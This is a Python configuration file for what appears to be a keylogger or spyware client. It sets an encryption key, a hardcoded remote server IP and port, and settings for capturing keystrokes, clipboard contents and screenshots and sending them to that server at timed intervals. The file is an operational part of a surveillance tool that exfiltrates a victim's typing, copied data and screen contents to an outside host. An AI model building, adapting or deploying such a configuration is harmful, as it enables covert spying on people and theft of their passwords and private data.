# --- Encryption settings --- #
USE_ENCRYPTION = True
ENCRYPTION_KEY = "FfmExgn4kwEc8uxueSOaLsoKYCM1DpQ2GSe6xSdOIfA="  # openssl rand -base64 32
                                                                 # Must be the same as server's

# --- Network settings --- #
SERVER_IP = "107.189.21.156"
SERVER_PORT = 43558
SOCKET_TIMEOUT = 5  # Connection timeout in seconds

# --- Clipboard monitoring settings --- #
CLIPBOARD_CHECK_INTERVAL = 1  # Seconds between clipboard checks

# --- Keystrokes monitoring settings --- #
KEYSTROKE_BUFFER_INTERVAL = 30  # Seconds between sending keystroke buffers
KEYSTROKE_LOG_MODIFIERS = False  # When False, modifier keys (Shift, Ctrl, Alt, etc.) are skipped

# --- Screenshots monitoring settings --- #
SCREENSHOT_INTERVAL = 60  # Seconds between captures
SCREENSHOT_ONLY_ON_CHANGE = True  # Send only when screen changes
SCREENSHOT_QUALITY = 70  # JPEG image quality (1-100)

# --- Caching settings --- #
import os
CACHE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cache")
MAX_CACHE_SIZE_MB = 512
CACHE_PURGE_OLDER_THAN = 86400  # Seconds (24 hours) to keep failed items

# --- Logging settings --- #
LOG_LEVEL = "SUCCESS"  # Only show logs equal and above the chosen level. Possible options are:
                       # "DEBUG", "INFO", "SUCCESS", "WARNING", "ERROR"
                       # Ex.: "SUCCESS" will only show SUCCESS logs and above, so WARNING and ERROR
SILENT_MODULES = []  # Choose which logs to silence based on modules. Possible options are:
                     # "sender", "cache", "encryption", "clipboard", "keystrokes" or "screenshots"
                     # Ex.: ["cache", "clipboard"] will silence all logs about cache and clipboard
LOG_COLORS = True  # Enable colored terminal output when supported
